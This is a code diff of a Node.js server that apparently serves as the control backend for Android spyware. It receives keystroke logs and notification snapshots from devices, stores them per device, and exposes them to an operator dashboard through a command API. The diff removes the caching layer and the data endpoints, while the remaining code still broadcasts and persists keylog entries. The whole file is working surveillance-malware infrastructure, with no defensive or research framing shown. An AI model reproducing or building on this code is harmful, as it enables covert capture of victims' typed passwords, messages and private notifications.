@@ -550,53 +550,9 @@ async function processMessage(clientId, clientType, event, data) {
         const deviceId = conn?.deviceId || data?.deviceId;
         if (deviceId) {
             const entry = { ...data, deviceId, timestamp: data.timestamp || new Date().toISOString() };
-            if (!global.deviceKeylogs) global.deviceKeylogs = new Map();
-            const kl = global.deviceKeylogs.get(deviceId) || [];
-            kl.unshift(entry);
-            if (kl.length > 500) kl.pop();
-            global.deviceKeylogs.set(deviceId, kl);
             broadcastDash('keylog:push', entry);
             // Persist to Redis (non-blocking)
             R.pushKeylog(deviceId, entry).catch(() => {});
-        }
-        return;
-    }
-
-    // ── Keylog snapshot from Android on connect → populate cache ─────
-    if (event === 'keylog:snapshot') {
-        const conn = tcpClients.get(clientId);
-        if (conn) conn.lastPong = Date.now();
-        const deviceId = conn?.deviceId || data?.deviceId;
-        if (deviceId && Array.isArray(data?.logs)) {
-            if (!global.deviceKeylogs) global.deviceKeylogs = new Map();
-            const existing = global.deviceKeylogs.get(deviceId) || [];
-            const merged = [...existing];
-            const seen = new Set(existing.map(e => `${e.packageName}|${e.timestamp}|${e.text}`));
-            for (const e of data.logs) {
-                const k = `${e.packageName}|${e.timestamp}|${e.text}`;
-                if (!seen.has(k)) { seen.add(k); merged.push(e); }
-            }
-            merged.sort((a, b) => (b.timestamp || '').localeCompare(a.timestamp || ''));
-            global.deviceKeylogs.set(deviceId, merged.slice(0, 500));
-        }
-        return;
-    }
-
-    // ── Notification snapshot from Android on connect → populate cache
-    if (event === 'notification:snapshot') {
-        const conn = tcpClients.get(clientId);
-        if (conn) conn.lastPong = Date.now();
-        const deviceId = conn?.deviceId || data?.deviceId;
-        if (deviceId && Array.isArray(data?.notifications)) {
-            if (!global.deviceNotifications) global.deviceNotifications = new Map();
-            const existing = global.deviceNotifications.get(deviceId) || [];
-            const merged = [...existing];
-            const seen = new Set(existing.map(n => `${n.packageName}|${n.postTime}|${n.title}|${n.text}`));
-            for (const n of data.notifications) {
-                const k = `${n.packageName}|${n.postTime}|${n.title}|${n.text}`;
-                if (!seen.has(k)) { seen.add(k); merged.unshift(n); }
-            }
-            global.deviceNotifications.set(deviceId, merged.slice(0, 200));
         }
         return;
     }
@@ -1078,37 +1034,6 @@ app.post('/api/commands', async (req, res) => {
     const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;
     if (!tcpConn || !tcpConn.writable) return res.status(503).json({ error: 'Device offline', deviceId });
 
-    // ── Intercept: serve data-fetch commands from server cache — never queue on device ──
-    if (command === 'get_keylogs' || command === 'get_notifications' || command === 'get_notifications_from_app') {
-        if (!global.deviceKeylogs)       global.deviceKeylogs       = new Map();
-        if (!global.deviceNotifications) global.deviceNotifications = new Map();
-
-        const commandId = crypto.randomBytes(12).toString('hex');
-        let response;
-
-        if (command === 'get_keylogs') {
-            const limit = Math.min((params && params.limit) || 200, 500);
-            const logs  = (global.deviceKeylogs.get(deviceId) || []).slice(0, limit);
-            response = { success: true, logs, count: logs.length, source: 'server_cache' };
-        } else {
-            const limit = Math.min((params && params.limit) || 100, 200);
-            let notifs = global.deviceNotifications.get(deviceId) || [];
-            if (command === 'get_notifications_from_app' && params && params.packageName) {
-                notifs = notifs.filter(n => n.packageName === params.packageName);
-            }
-            notifs = notifs.slice(0, limit);
-            response = { success: true, notifications: notifs, count: notifs.length, source: 'server_cache' };
-        }
-
-        // Emit result immediately via SSE — no Android involvement, no queue entry
-        broadcastDash('command:result', {
-            commandId, command, deviceId,
-            success: true, response,
-            timestamp: new Date(),
-        });
-        return res.json({ success: true, commandId, command, deviceId, params, status: 'executing', timestamp: new Date() });
-    }
-
     // ── Special: restart_connection — send connection:reset directly, no command queue ──
     if (command === 'restart_connection') {
         tcpSend(tcpConn, 'connection:reset', { reason: 'dashboard_request', timestamp: Date.now() });
@@ -1207,37 +1132,6 @@ app.delete('/api/tasks/:taskId', async (req, res) => {
 });
 
 app.get('/api/commands/registry', (req, res) => res.json({ success: true, commands: COMMANDS }));
-
-// ── Event-data REST endpoints (no Android command needed) ─────────────────────
-// Dashboard reads these directly so get_keylogs / get_notifications never
-// enter the device command queue.
-
-app.get('/api/data/:deviceId/keylogs', (req, res) => {
-    const { deviceId } = req.params;
-    const limit = Math.min(parseInt(req.query.limit) || 200, 500);
-    if (!global.deviceKeylogs) global.deviceKeylogs = new Map();
-    const logs = (global.deviceKeylogs.get(deviceId) || []).slice(0, limit);
-    res.json({ success: true, logs, count: logs.length, source: 'server_cache' });
-});
-
-app.get('/api/data/:deviceId/notifications', (req, res) => {
-    const { deviceId } = req.params;
-    const limit = Math.min(parseInt(req.query.limit) || 100, 200);
-    const pkg   = req.query.pkg || null;
-    if (!global.deviceNotifications) global.deviceNotifications = new Map();
-    let notifs = global.deviceNotifications.get(deviceId) || [];
-    if (pkg) notifs = notifs.filter(n => n.packageName === pkg);
-    notifs = notifs.slice(0, limit);
-    res.json({ success: true, notifications: notifs, count: notifs.length, source: 'server_cache' });
-});
-
-app.get('/api/data/:deviceId/activity', (req, res) => {
-    const { deviceId } = req.params;
-    const limit = Math.min(parseInt(req.query.limit) || 100, 200);
-    if (!global.deviceActivity) global.deviceActivity = new Map();
-    const activity = (global.deviceActivity.get(deviceId) || []).slice(0, limit);
-    res.json({ success: true, activity, count: activity.length, source: 'server_cache' });
-});
 
 app.get('/api/health', async (req, res) => {
     const redisStats = await R.getStats();
